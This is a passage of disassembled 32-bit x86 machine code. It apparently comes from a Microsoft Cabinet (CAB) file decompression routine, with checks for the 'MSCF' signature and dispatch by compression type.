 1006a79:	66 8b 86 ac 00 00 00 	mov    0xac(%esi),%ax
 1006a80:	57                   	push   %edi
 1006a81:	66 89 86 de 07 00 00 	mov    %ax,0x7de(%esi)
 1006a88:	66 8b 46 70          	mov    0x70(%esi),%ax
 1006a8c:	8d be bc 07 00 00    	lea    0x7bc(%esi),%edi
 1006a92:	66 89 86 da 07 00 00 	mov    %ax,0x7da(%esi)
 1006a99:	8b 46 38             	mov    0x38(%esi),%eax
 1006a9c:	57                   	push   %edi
 1006a9d:	6a 05                	push   $0x5
 1006a9f:	89 1f                	mov    %ebx,(%edi)
 1006aa1:	89 86 cc 07 00 00    	mov    %eax,0x7cc(%esi)
 1006aa7:	ff 56 24             	call   *0x24(%esi)
 1006aaa:	83 f8 ff             	cmp    $0xffffffff,%eax
 1006aad:	59                   	pop    %ecx
 1006aae:	59                   	pop    %ecx
 1006aaf:	75 0f                	jne    0x1006ac0
 1006ab1:	6a 00                	push   $0x0
 1006ab3:	6a 0b                	push   $0xb
 1006ab5:	ff 36                	push   (%esi)
 1006ab7:	e8 f8 0d 00 00       	call   0x10078b4
 1006abc:	33 c0                	xor    %eax,%eax
 1006abe:	eb 30                	jmp    0x1006af0
 1006ac0:	66 8b 86 de 07 00 00 	mov    0x7de(%esi),%ax
 1006ac7:	66 85 c0             	test   %ax,%ax
 1006aca:	66 89 86 ac 00 00 00 	mov    %ax,0xac(%esi)
 1006ad1:	74 1a                	je     0x1006aed
 1006ad3:	8b 3f                	mov    (%edi),%edi
 1006ad5:	3b fb                	cmp    %ebx,%edi
 1006ad7:	74 14                	je     0x1006aed
 1006ad9:	6a 00                	push   $0x0
 1006adb:	57                   	push   %edi
 1006adc:	ff b6 88 00 00 00    	push   0x88(%esi)
 1006ae2:	ff 56 1c             	call   *0x1c(%esi)
 1006ae5:	83 c4 0c             	add    $0xc,%esp
 1006ae8:	83 f8 ff             	cmp    $0xffffffff,%eax
 1006aeb:	74 c4                	je     0x1006ab1
 1006aed:	33 c0                	xor    %eax,%eax
 1006aef:	40                   	inc    %eax
 1006af0:	5f                   	pop    %edi
 1006af1:	5e                   	pop    %esi
 1006af2:	5b                   	pop    %ebx
 1006af3:	5d                   	pop    %ebp
 1006af4:	c2 04 00             	ret    $0x4
 1006af7:	cc                   	int3
 1006af8:	cc                   	int3
 1006af9:	cc                   	int3
 1006afa:	cc                   	int3
 1006afb:	cc                   	int3
 1006afc:	8b ff                	mov    %edi,%edi
 1006afe:	55                   	push   %ebp
 1006aff:	8b ec                	mov    %esp,%ebp
 1006b01:	56                   	push   %esi
 1006b02:	8b 75 08             	mov    0x8(%ebp),%esi
 1006b05:	33 c0                	xor    %eax,%eax
 1006b07:	8a 86 b2 00 00 00    	mov    0xb2(%esi),%al
 1006b0d:	57                   	push   %edi
 1006b0e:	33 ff                	xor    %edi,%edi
 1006b10:	83 e0 0f             	and    $0xf,%eax
 1006b13:	2b c7                	sub    %edi,%eax
 1006b15:	74 42                	je     0x1006b59
 1006b17:	48                   	dec    %eax
 1006b18:	74 2d                	je     0x1006b47
 1006b1a:	48                   	dec    %eax
 1006b1b:	74 20                	je     0x1006b3d
 1006b1d:	48                   	dec    %eax
 1006b1e:	74 13                	je     0x1006b33
 1006b20:	83 e8 0c             	sub    $0xc,%eax
 1006b23:	74 42                	je     0x1006b67
 1006b25:	57                   	push   %edi
 1006b26:	6a 06                	push   $0x6
 1006b28:	ff 36                	push   (%esi)
 1006b2a:	e8 85 0d 00 00       	call   0x10078b4
 1006b2f:	33 c0                	xor    %eax,%eax
 1006b31:	eb 37                	jmp    0x1006b6a
 1006b33:	ff 76 34             	push   0x34(%esi)
 1006b36:	e8 44 0f 00 00       	call   0x1007a7f
 1006b3b:	eb 12                	jmp    0x1006b4f
 1006b3d:	ff 76 34             	push   0x34(%esi)
 1006b40:	e8 46 cc ff ff       	call   0x100378b
 1006b45:	eb 08                	jmp    0x1006b4f
 1006b47:	ff 76 34             	push   0x34(%esi)
 1006b4a:	e8 3c cc ff ff       	call   0x100378b
 1006b4f:	85 c0                	test   %eax,%eax
 1006b51:	59                   	pop    %ecx
 1006b52:	74 05                	je     0x1006b59
 1006b54:	57                   	push   %edi
 1006b55:	6a 07                	push   $0x7
 1006b57:	eb cf                	jmp    0x1006b28
 1006b59:	ff 76 3c             	push   0x3c(%esi)
 1006b5c:	ff 56 04             	call   *0x4(%esi)
 1006b5f:	ff 76 40             	push   0x40(%esi)
 1006b62:	ff 56 04             	call   *0x4(%esi)
 1006b65:	59                   	pop    %ecx
 1006b66:	59                   	pop    %ecx
 1006b67:	33 c0                	xor    %eax,%eax
 1006b69:	40                   	inc    %eax
 1006b6a:	5f                   	pop    %edi
 1006b6b:	5e                   	pop    %esi
 1006b6c:	5d                   	pop    %ebp
 1006b6d:	c2 04 00             	ret    $0x4
 1006b70:	cc                   	int3
 1006b71:	cc                   	int3
 1006b72:	cc                   	int3
 1006b73:	cc                   	int3
 1006b74:	cc                   	int3
 1006b75:	8b ff                	mov    %edi,%edi
 1006b77:	55                   	push   %ebp
 1006b78:	8b ec                	mov    %esp,%ebp
 1006b7a:	83 ec 10             	sub    $0x10,%esp
 1006b7d:	53                   	push   %ebx
 1006b7e:	56                   	push   %esi
 1006b7f:	8b 75 08             	mov    0x8(%ebp),%esi
 1006b82:	0f b7 8e b2 00 00 00 	movzwl 0xb2(%esi),%ecx
 1006b89:	8b c1                	mov    %ecx,%eax
 1006b8b:	57                   	push   %edi
 1006b8c:	83 e0 0f             	and    $0xf,%eax
 1006b8f:	33 ff                	xor    %edi,%edi
 1006b91:	2b c7                	sub    %edi,%eax
 1006b93:	8d 96 94 00 00 00    	lea    0x94(%esi),%edx
 1006b99:	c7 02 00 80 00 00    	movl   $0x8000,(%edx)
 1006b9f:	0f 84 8d 00 00 00    	je     0x1006c32
 1006ba5:	48                   	dec    %eax
 1006ba6:	74 69                	je     0x1006c11
 1006ba8:	48                   	dec    %eax
 1006ba9:	74 3c                	je     0x1006be7
 1006bab:	48                   	dec    %eax
 1006bac:	74 0d                	je     0x1006bbb
 1006bae:	83 e8 0c             	sub    $0xc,%eax
 1006bb1:	0f 84 77 01 00 00    	je     0x1006d2e
 1006bb7:	6a 06                	push   $0x6
 1006bb9:	eb 6f                	jmp    0x1006c2a
 1006bbb:	57                   	push   %edi
 1006bbc:	57                   	push   %edi
 1006bbd:	57                   	push   %edi
 1006bbe:	57                   	push   %edi
 1006bbf:	33 c0                	xor    %eax,%eax
 1006bc1:	57                   	push   %edi
 1006bc2:	c1 e9 08             	shr    $0x8,%ecx
 1006bc5:	40                   	inc    %eax
 1006bc6:	57                   	push   %edi
 1006bc7:	83 e1 1f             	and    $0x1f,%ecx
 1006bca:	d3 e0                	shl    %cl,%eax
 1006bcc:	8d 9e 98 00 00 00    	lea    0x98(%esi),%ebx
 1006bd2:	53                   	push   %ebx
 1006bd3:	57                   	push   %edi
 1006bd4:	89 45 f0             	mov    %eax,-0x10(%ebp)
 1006bd7:	57                   	push   %edi
 1006bd8:	8d 45 f0             	lea    -0x10(%ebp),%eax
 1006bdb:	50                   	push   %eax
 1006bdc:	52                   	push   %edx
 1006bdd:	e8 60 0d 00 00       	call   0x1007942
 1006be2:	83 c4 2c             	add    $0x2c,%esp
 1006be5:	eb 3d                	jmp    0x1006c24
 1006be7:	8b 46 20             	mov    0x20(%esi),%eax
 1006bea:	57                   	push   %edi
 1006beb:	57                   	push   %edi
 1006bec:	57                   	push   %edi
 1006bed:	57                   	push   %edi
 1006bee:	57                   	push   %edi
 1006bef:	57                   	push   %edi
 1006bf0:	8d 9e 98 00 00 00    	lea    0x98(%esi),%ebx
 1006bf6:	53                   	push   %ebx
 1006bf7:	57                   	push   %edi
 1006bf8:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1006bfb:	57                   	push   %edi
 1006bfc:	8d 45 f8             	lea    -0x8(%ebp),%eax
 1006bff:	c1 e9 08             	shr    $0x8,%ecx
 1006c02:	50                   	push   %eax
 1006c03:	83 e1 1f             	and    $0x1f,%ecx
 1006c06:	52                   	push   %edx
 1006c07:	89 4d f8             	mov    %ecx,-0x8(%ebp)
 1006c0a:	e8 74 cb ff ff       	call   0x1003783
 1006c0f:	eb d1                	jmp    0x1006be2
 1006c11:	57                   	push   %edi
 1006c12:	8d 9e 98 00 00 00    	lea    0x98(%esi),%ebx
 1006c18:	53                   	push   %ebx
 1006c19:	57                   	push   %edi
 1006c1a:	57                   	push   %edi
 1006c1b:	52                   	push   %edx
 1006c1c:	e8 62 cb ff ff       	call   0x1003783
 1006c21:	83 c4 14             	add    $0x14,%esp
 1006c24:	85 c0                	test   %eax,%eax
 1006c26:	74 16                	je     0x1006c3e
 1006c28:	6a 07                	push   $0x7
 1006c2a:	58                   	pop    %eax
 1006c2b:	57                   	push   %edi
 1006c2c:	50                   	push   %eax
 1006c2d:	e9 e8 00 00 00       	jmp    0x1006d1a
 1006c32:	8d 9e 98 00 00 00    	lea    0x98(%esi),%ebx
 1006c38:	c7 03 00 80 00 00    	movl   $0x8000,(%ebx)
 1006c3e:	ff 33                	push   (%ebx)
 1006c40:	ff 56 08             	call   *0x8(%esi)
 1006c43:	3b c7                	cmp    %edi,%eax
 1006c45:	59                   	pop    %ecx
 1006c46:	89 46 3c             	mov    %eax,0x3c(%esi)
 1006c49:	75 08                	jne    0x1006c53
 1006c4b:	57                   	push   %edi
 1006c4c:	6a 05                	push   $0x5
 1006c4e:	e9 c7 00 00 00       	jmp    0x1006d1a
 1006c53:	ff b6 94 00 00 00    	push   0x94(%esi)
 1006c59:	ff 56 08             	call   *0x8(%esi)
 1006c5c:	3b c7                	cmp    %edi,%eax
 1006c5e:	59                   	pop    %ecx
 1006c5f:	89 46 40             	mov    %eax,0x40(%esi)
 1006c62:	75 09                	jne    0x1006c6d
 1006c64:	ff 76 3c             	push   0x3c(%esi)
 1006c67:	ff 56 04             	call   *0x4(%esi)
 1006c6a:	59                   	pop    %ecx
 1006c6b:	eb de                	jmp    0x1006c4b
 1006c6d:	33 c0                	xor    %eax,%eax
 1006c6f:	8a 86 b2 00 00 00    	mov    0xb2(%esi),%al
 1006c75:	83 e0 0f             	and    $0xf,%eax
 1006c78:	48                   	dec    %eax
 1006c79:	74 65                	je     0x1006ce0
 1006c7b:	48                   	dec    %eax
 1006c7c:	74 33                	je     0x1006cb1
 1006c7e:	48                   	dec    %eax
 1006c7f:	0f 85 a9 00 00 00    	jne    0x1006d2e
 1006c85:	ff 76 1c             	push   0x1c(%esi)
 1006c88:	8d 46 34             	lea    0x34(%esi),%eax
 1006c8b:	ff 76 18             	push   0x18(%esi)
 1006c8e:	ff 76 14             	push   0x14(%esi)
 1006c91:	ff 76 10             	push   0x10(%esi)
 1006c94:	ff 76 0c             	push   0xc(%esi)
 1006c97:	50                   	push   %eax
 1006c98:	53                   	push   %ebx
 1006c99:	ff 76 04             	push   0x4(%esi)
 1006c9c:	8d 45 f0             	lea    -0x10(%ebp),%eax
 1006c9f:	ff 76 08             	push   0x8(%esi)
 1006ca2:	50                   	push   %eax
 1006ca3:	8d 86 94 00 00 00    	lea    0x94(%esi),%eax
 1006ca9:	50                   	push   %eax
 1006caa:	e8 93 0c 00 00       	call   0x1007942
 1006caf:	eb 2a                	jmp    0x1006cdb
 1006cb1:	ff 76 1c             	push   0x1c(%esi)
 1006cb4:	8d 46 34             	lea    0x34(%esi),%eax
 1006cb7:	ff 76 18             	push   0x18(%esi)
 1006cba:	ff 76 14             	push   0x14(%esi)
 1006cbd:	ff 76 10             	push   0x10(%esi)
 1006cc0:	ff 76 0c             	push   0xc(%esi)
 1006cc3:	50                   	push   %eax
 1006cc4:	53                   	push   %ebx
 1006cc5:	ff 76 04             	push   0x4(%esi)
 1006cc8:	8d 45 f8             	lea    -0x8(%ebp),%eax
 1006ccb:	ff 76 08             	push   0x8(%esi)
 1006cce:	50                   	push   %eax
 1006ccf:	8d 86 94 00 00 00    	lea    0x94(%esi),%eax
 1006cd5:	50                   	push   %eax
 1006cd6:	e8 a8 ca ff ff       	call   0x1003783
 1006cdb:	83 c4 2c             	add    $0x2c,%esp
 1006cde:	eb 1a                	jmp    0x1006cfa
 1006ce0:	8d 46 34             	lea    0x34(%esi),%eax
 1006ce3:	50                   	push   %eax
 1006ce4:	53                   	push   %ebx
 1006ce5:	ff 76 04             	push   0x4(%esi)
 1006ce8:	8d 86 94 00 00 00    	lea    0x94(%esi),%eax
 1006cee:	ff 76 08             	push   0x8(%esi)
 1006cf1:	50                   	push   %eax
 1006cf2:	e8 8c ca ff ff       	call   0x1003783
 1006cf7:	83 c4 14             	add    $0x14,%esp
 1006cfa:	3b c7                	cmp    %edi,%eax
 1006cfc:	74 30                	je     0x1006d2e
 1006cfe:	ff 76 3c             	push   0x3c(%esi)
 1006d01:	33 db                	xor    %ebx,%ebx
 1006d03:	83 f8 01             	cmp    $0x1,%eax
 1006d06:	0f 95 c3             	setne  %bl
 1006d09:	8d 5c 1b 05          	lea    0x5(%ebx,%ebx,1),%ebx
 1006d0d:	ff 56 04             	call   *0x4(%esi)
 1006d10:	ff 76 40             	push   0x40(%esi)
 1006d13:	ff 56 04             	call   *0x4(%esi)
 1006d16:	59                   	pop    %ecx
 1006d17:	59                   	pop    %ecx
 1006d18:	57                   	push   %edi
 1006d19:	53                   	push   %ebx
 1006d1a:	ff 36                	push   (%esi)
 1006d1c:	e8 93 0b 00 00       	call   0x10078b4
 1006d21:	66 c7 86 b2 00 00 00 	movw   $0xf,0xb2(%esi)
 1006d28:	0f 00 
 1006d2a:	33 c0                	xor    %eax,%eax
 1006d2c:	eb 03                	jmp    0x1006d31
 1006d2e:	33 c0                	xor    %eax,%eax
 1006d30:	40                   	inc    %eax
 1006d31:	5f                   	pop    %edi
 1006d32:	5e                   	pop    %esi
 1006d33:	5b                   	pop    %ebx
 1006d34:	c9                   	leave
 1006d35:	c2 04 00             	ret    $0x4
 1006d38:	cc                   	int3
 1006d39:	cc                   	int3
 1006d3a:	cc                   	int3
 1006d3b:	cc                   	int3
 1006d3c:	cc                   	int3
 1006d3d:	8b ff                	mov    %edi,%edi
 1006d3f:	55                   	push   %ebp
 1006d40:	8b ec                	mov    %esp,%ebp
 1006d42:	56                   	push   %esi
 1006d43:	8b 75 08             	mov    0x8(%ebp),%esi
 1006d46:	33 c0                	xor    %eax,%eax
 1006d48:	8a 86 b2 00 00 00    	mov    0xb2(%esi),%al
 1006d4e:	57                   	push   %edi
 1006d4f:	33 ff                	xor    %edi,%edi
 1006d51:	83 e0 0f             	and    $0xf,%eax
 1006d54:	2b c7                	sub    %edi,%eax
 1006d56:	74 42                	je     0x1006d9a
 1006d58:	48                   	dec    %eax
 1006d59:	74 2d                	je     0x1006d88
 1006d5b:	48                   	dec    %eax
 1006d5c:	74 20                	je     0x1006d7e
 1006d5e:	48                   	dec    %eax
 1006d5f:	74 13                	je     0x1006d74
 1006d61:	83 e8 0c             	sub    $0xc,%eax
 1006d64:	74 34                	je     0x1006d9a
 1006d66:	57                   	push   %edi
 1006d67:	6a 06                	push   $0x6
 1006d69:	ff 36                	push   (%esi)
 1006d6b:	e8 44 0b 00 00       	call   0x10078b4
 1006d70:	33 c0                	xor    %eax,%eax
 1006d72:	eb 29                	jmp    0x1006d9d
 1006d74:	ff 76 34             	push   0x34(%esi)
 1006d77:	e8 dd 0c 00 00       	call   0x1007a59
 1006d7c:	eb 12                	jmp    0x1006d90
 1006d7e:	ff 76 34             	push   0x34(%esi)
 1006d81:	e8 05 ca ff ff       	call   0x100378b
 1006d86:	eb 08                	jmp    0x1006d90
 1006d88:	ff 76 34             	push   0x34(%esi)
 1006d8b:	e8 fb c9 ff ff       	call   0x100378b
 1006d90:	85 c0                	test   %eax,%eax
 1006d92:	59                   	pop    %ecx
 1006d93:	74 05                	je     0x1006d9a
 1006d95:	57                   	push   %edi
 1006d96:	6a 07                	push   $0x7
 1006d98:	eb cf                	jmp    0x1006d69
 1006d9a:	33 c0                	xor    %eax,%eax
 1006d9c:	40                   	inc    %eax
 1006d9d:	5f                   	pop    %edi
 1006d9e:	5e                   	pop    %esi
 1006d9f:	5d                   	pop    %ebp
 1006da0:	c2 04 00             	ret    $0x4
 1006da3:	cc                   	int3
 1006da4:	cc                   	int3
 1006da5:	cc                   	int3
 1006da6:	cc                   	int3
 1006da7:	cc                   	int3
 1006da8:	8b ff                	mov    %edi,%edi
 1006daa:	55                   	push   %ebp
 1006dab:	8b ec                	mov    %esp,%ebp
 1006dad:	53                   	push   %ebx
 1006dae:	56                   	push   %esi
 1006daf:	57                   	push   %edi
 1006db0:	8b 7d 08             	mov    0x8(%ebp),%edi
 1006db3:	33 c0                	xor    %eax,%eax
 1006db5:	8a 87 b2 00 00 00    	mov    0xb2(%edi),%al
 1006dbb:	33 db                	xor    %ebx,%ebx
 1006dbd:	83 e0 0f             	and    $0xf,%eax
 1006dc0:	2b c3                	sub    %ebx,%eax
 1006dc2:	0f 84 a6 00 00 00    	je     0x1006e6e
 1006dc8:	48                   	dec    %eax
 1006dc9:	74 6d                	je     0x1006e38
 1006dcb:	48                   	dec    %eax
 1006dcc:	74 45                	je     0x1006e13
 1006dce:	48                   	dec    %eax
 1006dcf:	74 08                	je     0x1006dd9
 1006dd1:	53                   	push   %ebx
 1006dd2:	6a 06                	push   $0x6
 1006dd4:	e9 cc 00 00 00       	jmp    0x1006ea5
 1006dd9:	8b 75 0c             	mov    0xc(%ebp),%esi
 1006ddc:	0f b7 06             	movzwl (%esi),%eax
 1006ddf:	89 45 08             	mov    %eax,0x8(%ebp)
 1006de2:	8d 45 08             	lea    0x8(%ebp),%eax
 1006de5:	50                   	push   %eax
 1006de6:	8b 47 48             	mov    0x48(%edi),%eax
 1006de9:	ff 77 40             	push   0x40(%edi)
 1006dec:	0f b7 40 04          	movzwl 0x4(%eax),%eax
 1006df0:	50                   	push   %eax
 1006df1:	ff 77 3c             	push   0x3c(%edi)
 1006df4:	ff 77 34             	push   0x34(%edi)
 1006df7:	e8 08 0c 00 00       	call   0x1007a04
 1006dfc:	83 c4 14             	add    $0x14,%esp
 1006dff:	85 c0                	test   %eax,%eax
 1006e01:	0f 85 9b 00 00 00    	jne    0x1006ea2
 1006e07:	66 8b 45 08          	mov    0x8(%ebp),%ax
 1006e0b:	66 89 06             	mov    %ax,(%esi)
 1006e0e:	e9 8a 00 00 00       	jmp    0x1006e9d
 1006e13:	8b 75 0c             	mov    0xc(%ebp),%esi
 1006e16:	0f b7 06             	movzwl (%esi),%eax
 1006e19:	89 45 08             	mov    %eax,0x8(%ebp)
 1006e1c:	8d 45 08             	lea    0x8(%ebp),%eax
 1006e1f:	50                   	push   %eax
 1006e20:	8b 47 48             	mov    0x48(%edi),%eax
 1006e23:	ff 77 40             	push   0x40(%edi)
 1006e26:	0f b7 40 04          	movzwl 0x4(%eax),%eax
 1006e2a:	50                   	push   %eax
 1006e2b:	ff 77 3c             	push   0x3c(%edi)
 1006e2e:	ff 77 34             	push   0x34(%edi)
 1006e31:	e8 55 c9 ff ff       	call   0x100378b
 1006e36:	eb c4                	jmp    0x1006dfc
 1006e38:	8b 87 94 00 00 00    	mov    0x94(%edi),%eax
 1006e3e:	89 45 08             	mov    %eax,0x8(%ebp)
 1006e41:	8d 45 08             	lea    0x8(%ebp),%eax
 1006e44:	50                   	push   %eax
 1006e45:	8b 47 48             	mov    0x48(%edi),%eax
 1006e48:	ff 77 40             	push   0x40(%edi)
 1006e4b:	0f b7 40 04          	movzwl 0x4(%eax),%eax
 1006e4f:	50                   	push   %eax
 1006e50:	ff 77 3c             	push   0x3c(%edi)
 1006e53:	ff 77 34             	push   0x34(%edi)
 1006e56:	e8 30 c9 ff ff       	call   0x100378b
 1006e5b:	83 c4 14             	add    $0x14,%esp
 1006e5e:	85 c0                	test   %eax,%eax
 1006e60:	75 40                	jne    0x1006ea2
 1006e62:	8b 45 0c             	mov    0xc(%ebp),%eax
 1006e65:	66 8b 4d 08          	mov    0x8(%ebp),%cx
 1006e69:	66 89 08             	mov    %cx,(%eax)
 1006e6c:	eb 2f                	jmp    0x1006e9d
 1006e6e:	8b 47 48             	mov    0x48(%edi),%eax
 1006e71:	66 8b 40 04          	mov    0x4(%eax),%ax
 1006e75:	0f b7 c8             	movzwl %ax,%ecx
 1006e78:	3b 8f 94 00 00 00    	cmp    0x94(%edi),%ecx
 1006e7e:	77 22                	ja     0x1006ea2
 1006e80:	8b 4d 0c             	mov    0xc(%ebp),%ecx
 1006e83:	66 89 01             	mov    %ax,(%ecx)
 1006e86:	8b 77 3c             	mov    0x3c(%edi),%esi
 1006e89:	8b 7f 40             	mov    0x40(%edi),%edi
 1006e8c:	0f b7 c8             	movzwl %ax,%ecx
 1006e8f:	8b c1                	mov    %ecx,%eax
 1006e91:	c1 e9 02             	shr    $0x2,%ecx
 1006e94:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
 1006e96:	8b c8                	mov    %eax,%ecx
 1006e98:	83 e1 03             	and    $0x3,%ecx
 1006e9b:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
 1006e9d:	33 c0                	xor    %eax,%eax
 1006e9f:	40                   	inc    %eax
 1006ea0:	eb 0c                	jmp    0x1006eae
 1006ea2:	53                   	push   %ebx
 1006ea3:	6a 07                	push   $0x7
 1006ea5:	ff 37                	push   (%edi)
 1006ea7:	e8 08 0a 00 00       	call   0x10078b4
 1006eac:	33 c0                	xor    %eax,%eax
 1006eae:	5f                   	pop    %edi
 1006eaf:	5e                   	pop    %esi
 1006eb0:	5b                   	pop    %ebx
 1006eb1:	5d                   	pop    %ebp
 1006eb2:	c2 08 00             	ret    $0x8
 1006eb5:	cc                   	int3
 1006eb6:	cc                   	int3
 1006eb7:	cc                   	int3
 1006eb8:	cc                   	int3
 1006eb9:	cc                   	int3
 1006eba:	8b ff                	mov    %edi,%edi
 1006ebc:	55                   	push   %ebp
 1006ebd:	8b ec                	mov    %esp,%ebp
 1006ebf:	56                   	push   %esi
 1006ec0:	8b 75 0c             	mov    0xc(%ebp),%esi
 1006ec3:	57                   	push   %edi
 1006ec4:	8b 7d 08             	mov    0x8(%ebp),%edi
 1006ec7:	8d 45 0c             	lea    0xc(%ebp),%eax
 1006eca:	50                   	push   %eax
 1006ecb:	56                   	push   %esi
 1006ecc:	57                   	push   %edi
 1006ecd:	e8 91 f7 ff ff       	call   0x1006663
 1006ed2:	85 c0                	test   %eax,%eax
 1006ed4:	7c 11                	jl     0x1006ee7
 1006ed6:	ff 75 10             	push   0x10(%ebp)
 1006ed9:	8b 45 0c             	mov    0xc(%ebp),%eax
 1006edc:	2b f0                	sub    %eax,%esi
 1006ede:	56                   	push   %esi
 1006edf:	03 c7                	add    %edi,%eax
 1006ee1:	50                   	push   %eax
 1006ee2:	e8 3a f7 ff ff       	call   0x1006621
 1006ee7:	5f                   	pop    %edi
 1006ee8:	5e                   	pop    %esi
 1006ee9:	5d                   	pop    %ebp
 1006eea:	c2 0c 00             	ret    $0xc
 1006eed:	cc                   	int3
 1006eee:	cc                   	int3
 1006eef:	cc                   	int3
 1006ef0:	cc                   	int3
 1006ef1:	cc                   	int3
 1006ef2:	8b ff                	mov    %edi,%edi
 1006ef4:	55                   	push   %ebp
 1006ef5:	8b ec                	mov    %esp,%ebp
 1006ef7:	56                   	push   %esi
 1006ef8:	8b 75 08             	mov    0x8(%ebp),%esi
 1006efb:	6a 10                	push   $0x10
 1006efd:	8d 46 74             	lea    0x74(%esi),%eax
 1006f00:	50                   	push   %eax
 1006f01:	ff b6 88 00 00 00    	push   0x88(%esi)
 1006f07:	ff 56 10             	call   *0x10(%esi)
 1006f0a:	83 c4 0c             	add    $0xc,%esp
 1006f0d:	83 f8 10             	cmp    $0x10,%eax
 1006f10:	75 1b                	jne    0x1006f2d
 1006f12:	56                   	push   %esi
 1006f13:	68 00 01 00 00       	push   $0x100
 1006f18:	8d 86 b4 00 00 00    	lea    0xb4(%esi),%eax
 1006f1e:	50                   	push   %eax
 1006f1f:	e8 97 fa ff ff       	call   0x10069bb
 1006f24:	85 c0                	test   %eax,%eax
 1006f26:	74 05                	je     0x1006f2d
 1006f28:	33 c0                	xor    %eax,%eax
 1006f2a:	40                   	inc    %eax
 1006f2b:	eb 0d                	jmp    0x1006f3a
 1006f2d:	6a 00                	push   $0x0
 1006f2f:	6a 04                	push   $0x4
 1006f31:	ff 36                	push   (%esi)
 1006f33:	e8 7c 09 00 00       	call   0x10078b4
 1006f38:	33 c0                	xor    %eax,%eax
 1006f3a:	5e                   	pop    %esi
 1006f3b:	5d                   	pop    %ebp
 1006f3c:	c2 04 00             	ret    $0x4
 1006f3f:	cc                   	int3
 1006f40:	cc                   	int3
 1006f41:	cc                   	int3
 1006f42:	cc                   	int3
 1006f43:	cc                   	int3
 1006f44:	8b ff                	mov    %edi,%edi
 1006f46:	55                   	push   %ebp
 1006f47:	8b ec                	mov    %esp,%ebp
 1006f49:	56                   	push   %esi
 1006f4a:	8b 75 0c             	mov    0xc(%ebp),%esi
 1006f4d:	57                   	push   %edi
 1006f4e:	66 8b 7d 08          	mov    0x8(%ebp),%di
 1006f52:	66 3b be b2 00 00 00 	cmp    0xb2(%esi),%di
 1006f59:	75 05                	jne    0x1006f60
 1006f5b:	33 c0                	xor    %eax,%eax
 1006f5d:	40                   	inc    %eax
 1006f5e:	eb 2b                	jmp    0x1006f8b
 1006f60:	56                   	push   %esi
 1006f61:	e8 96 fb ff ff       	call   0x1006afc
 1006f66:	85 c0                	test   %eax,%eax
 1006f68:	75 0e                	jne    0x1006f78
 1006f6a:	50                   	push   %eax
 1006f6b:	6a 07                	push   $0x7
 1006f6d:	ff 36                	push   (%esi)
 1006f6f:	e8 40 09 00 00       	call   0x10078b4
 1006f74:	33 c0                	xor    %eax,%eax
 1006f76:	eb 13                	jmp    0x1006f8b
 1006f78:	56                   	push   %esi
 1006f79:	66 89 be b2 00 00 00 	mov    %di,0xb2(%esi)
 1006f80:	e8 f0 fb ff ff       	call   0x1006b75
 1006f85:	f7 d8                	neg    %eax
 1006f87:	1b c0                	sbb    %eax,%eax
 1006f89:	f7 d8                	neg    %eax
 1006f8b:	5f                   	pop    %edi
 1006f8c:	5e                   	pop    %esi
 1006f8d:	5d                   	pop    %ebp
 1006f8e:	c2 08 00             	ret    $0x8
 1006f91:	cc                   	int3
 1006f92:	cc                   	int3
 1006f93:	cc                   	int3
 1006f94:	cc                   	int3
 1006f95:	cc                   	int3
 1006f96:	8b ff                	mov    %edi,%edi
 1006f98:	55                   	push   %ebp
 1006f99:	8b ec                	mov    %esp,%ebp
 1006f9b:	83 ec 24             	sub    $0x24,%esp
 1006f9e:	53                   	push   %ebx
 1006f9f:	8b 5d 08             	mov    0x8(%ebp),%ebx
 1006fa2:	56                   	push   %esi
 1006fa3:	57                   	push   %edi
 1006fa4:	8d 83 b9 05 00 00    	lea    0x5b9(%ebx),%eax
 1006faa:	50                   	push   %eax
 1006fab:	be 01 01 00 00       	mov    $0x101,%esi
 1006fb0:	56                   	push   %esi
 1006fb1:	8d bb ba 06 00 00    	lea    0x6ba(%ebx),%edi
 1006fb7:	57                   	push   %edi
 1006fb8:	e8 64 f6 ff ff       	call   0x1006621
 1006fbd:	ff 75 0c             	push   0xc(%ebp)
 1006fc0:	56                   	push   %esi
 1006fc1:	57                   	push   %edi
 1006fc2:	e8 f3 fe ff ff       	call   0x1006eba
 1006fc7:	bf 80 01 00 00       	mov    $0x180,%edi
 1006fcc:	57                   	push   %edi
 1006fcd:	be 00 80 00 00       	mov    $0x8000,%esi
 1006fd2:	8d 83 ba 06 00 00    	lea    0x6ba(%ebx),%eax
 1006fd8:	56                   	push   %esi
 1006fd9:	50                   	push   %eax
 1006fda:	ff 53 0c             	call   *0xc(%ebx)
 1006fdd:	83 c4 0c             	add    $0xc,%esp
 1006fe0:	83 f8 ff             	cmp    $0xffffffff,%eax
 1006fe3:	89 83 88 00 00 00    	mov    %eax,0x88(%ebx)
 1006fe9:	0f 84 39 02 00 00    	je     0x1007228
 1006fef:	57                   	push   %edi
 1006ff0:	8d 83 ba 06 00 00    	lea    0x6ba(%ebx),%eax
 1006ff6:	56                   	push   %esi
 1006ff7:	50                   	push   %eax
 1006ff8:	ff 53 0c             	call   *0xc(%ebx)
 1006ffb:	83 c4 0c             	add    $0xc,%esp
 1006ffe:	83 f8 ff             	cmp    $0xffffffff,%eax
 1007001:	89 83 84 00 00 00    	mov    %eax,0x84(%ebx)
 1007007:	0f 84 1b 02 00 00    	je     0x1007228
 100700d:	6a 24                	push   $0x24
 100700f:	8d 45 dc             	lea    -0x24(%ebp),%eax
 1007012:	50                   	push   %eax
 1007013:	ff b3 88 00 00 00    	push   0x88(%ebx)
 1007019:	ff 53 10             	call   *0x10(%ebx)
 100701c:	83 c4 0c             	add    $0xc,%esp
 100701f:	83 f8 24             	cmp    $0x24,%eax
 1007022:	74 07                	je     0x100702b
 1007024:	6a 00                	push   $0x0
 1007026:	e9 ce 00 00 00       	jmp    0x10070f9
 100702b:	81 7d dc 4d 53 43 46 	cmpl   $0x4643534d,-0x24(%ebp)
 1007032:	75 f0                	jne    0x1007024
 1007034:	66 81 7d f4 03 01    	cmpw   $0x103,-0xc(%ebp)
 100703a:	74 0c                	je     0x1007048
 100703c:	0f b7 45 f4          	movzwl -0xc(%ebp),%eax
 1007040:	50                   	push   %eax
 1007041:	6a 03                	push   $0x3
 1007043:	e9 e4 01 00 00       	jmp    0x100722c
 1007048:	66 8b 45 14          	mov    0x14(%ebp),%ax
 100704c:	66 3d ff ff          	cmp    $0xffff,%ax
 1007050:	74 19                	je     0x100706b
 1007052:	66 8b 4d 10          	mov    0x10(%ebp),%cx
